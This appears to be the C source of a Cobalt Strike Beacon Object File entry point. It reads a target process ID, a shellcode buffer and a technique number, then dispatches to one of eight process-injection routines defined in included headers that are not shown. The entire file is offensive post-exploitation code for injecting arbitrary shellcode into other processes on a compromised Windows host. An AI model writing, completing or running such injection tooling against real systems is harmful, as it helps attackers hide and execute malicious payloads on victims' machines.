#include "FirstGuest.h"
#include "SecondGuest.h"
#include "ThirdGuest.h"
#include "FourthGuest.h"
#include "FifthGuest.h"
#include "SixthGuest.h"
#include "SeventhGuest.h"
#include "EighthGuest.h"

void go(char * args, int len) {
    datap parser;
    BeaconDataParse(&parser, args, len);

    DWORD pid = BeaconDataInt(&parser);
    SIZE_T shellcodeSize = NULL;
    CHAR* shellcode = BeaconDataExtract(&parser, &shellcodeSize);
    DWORD technique = BeaconDataInt(&parser);

    BeaconPrintf(CALLBACK_OUTPUT, "Selected technique: %d", technique);

    switch(technique) {
		case 1: Inject1(pid, shellcode, shellcodeSize); break;
		case 2: Inject2(pid, shellcode, shellcodeSize); break;
		case 3: Inject3(pid, shellcode, shellcodeSize); break;
		case 4: Inject4(pid, shellcode, shellcodeSize); break;
		case 5: Inject5(pid, shellcode, shellcodeSize); break;
		case 6: Inject6(pid, shellcode, shellcodeSize); break;
		case 7: Inject7(pid, shellcode, shellcodeSize); break;
		case 8: Inject8(pid, shellcode, shellcodeSize); break;
		default: BeaconPrintf(CALLBACK_OUTPUT, "Invalid technique %d", technique);
    }
}
